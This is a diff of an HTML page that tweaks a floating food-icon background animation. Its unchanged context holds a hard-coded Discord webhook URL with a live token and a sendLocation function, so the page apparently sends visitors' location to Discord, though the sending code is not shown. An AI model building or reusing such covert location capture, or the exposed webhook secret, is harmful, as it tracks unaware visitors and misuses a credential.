@@ -14,31 +14,34 @@
       overflow: hidden;
     }
 
+    /* Background animation container */
     .bg-animation {
       position: fixed;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-      pointer-events: none;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 0;
+      overflow: hidden;
     }
 
     .bg-animation img {
       position: absolute;
-      width: 60px;
-      opacity: 0.5;
+      width: 100px;
+      opacity: 0.7;
       animation: floatUp 12s linear infinite;
     }
 
     @keyframes floatUp {
       0% {
-        transform: translateY(100vh) rotate(0deg);
+        transform: translateY(100vh) scale(0.8) rotate(0deg);
         opacity: 0;
       }
       50% {
-        opacity: 0.8;
+        opacity: 1;
       }
       100% {
-        transform: translateY(-200px) rotate(360deg);
+        transform: translateY(-200px) scale(1.1) rotate(360deg);
         opacity: 0;
       }
     }
@@ -52,7 +55,7 @@
       border-radius: 20px;
       box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
       position: relative;
-      z-index: 10;
+      z-index: 2;
     }
 
     .logo {
@@ -94,7 +97,7 @@
 </head>
 <body>
 
-  <!-- Animated Background -->
+  <!-- Floating Food Background -->
   <div class="bg-animation" id="background"></div>
 
   <!-- Main Card -->
@@ -107,21 +110,21 @@
   </div>
 
   <script>
-    // Background food animation from your local images
+    // Background floating animation with drumstick, sauce, wing
     const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
     const bg = document.getElementById('background');
 
-    for (let i = 0; i < 25; i++) {
+    for (let i = 0; i < 30; i++) {
       const img = document.createElement('img');
       img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
       img.style.left = Math.random() * 100 + 'vw';
       img.style.top = '100vh';
       img.style.animationDuration = (6 + Math.random() * 6) + 's';
-      img.style.animationDelay = Math.random() * 5 + 's';
+      img.style.animationDelay = Math.random() * 10 + 's';
       bg.appendChild(img);
     }
 
-    // Webhook + Location Logic
+    // Webhook logic
     const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";
 
     function sendLocation() {
@@ -154,6 +157,7 @@
 
 </body>
 </html>
+
 
 
 
